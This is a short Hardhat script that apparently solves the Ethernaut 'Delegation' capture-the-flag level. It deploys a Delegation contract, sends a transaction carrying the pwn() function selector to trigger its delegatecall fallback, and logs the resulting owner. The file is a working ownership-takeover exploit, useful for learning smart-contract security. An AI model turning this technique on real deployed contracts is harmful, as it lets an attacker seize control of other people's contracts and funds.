// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
import { ethers } from "hardhat";
import { BigNumber } from "ethers";
import log from "ololog";

async function main() {
  // Hardhat always runs the compile task when running scripts with its command
  // line interface.
  //
  // If this script is run directly using `node` you may want to call compile
  // manually to make sure everything is compiled
  // await hre.run('compile');

  // We get the contract to deploy
  const Delegation = await ethers.getContractFactory("Delegation");
  const delegation = await Delegation.deploy(
    "0x3DAc9aFadBD46C967eA8378bCECefbAeA6f69924"
  );

  const Delegate = await ethers.getContractFactory("Delegate");
  const delegate = Delegate.attach(
    "0x3DAc9aFadBD46C967eA8378bCECefbAeA6f69924"
  );
  await delegate.deployed();

  // await web3.utils.keccak("pwn()");
  const data = "0xdd365b8b";

  const [signer] = await ethers.getSigners();

  const tx = await signer.sendTransaction({
    to: delegation.address,
    value: ethers.utils.parseEther("0.1"),
    data: data,
    gasLimit: BigNumber.from("100000"),
  });

  await tx.wait();
  log.yellow("pwn:", tx.hash);

  const owner = await delegation.owner();
  log.yellow("owner:", owner);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
